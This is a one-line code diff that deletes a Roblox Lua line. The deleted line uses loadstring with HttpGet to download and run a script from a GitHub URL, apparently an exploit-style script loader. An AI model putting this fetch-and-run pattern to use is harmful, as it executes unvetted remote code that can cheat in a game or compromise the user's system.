@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ghostface33/robloxscripts/main/bloxtonroles.lua", true))()
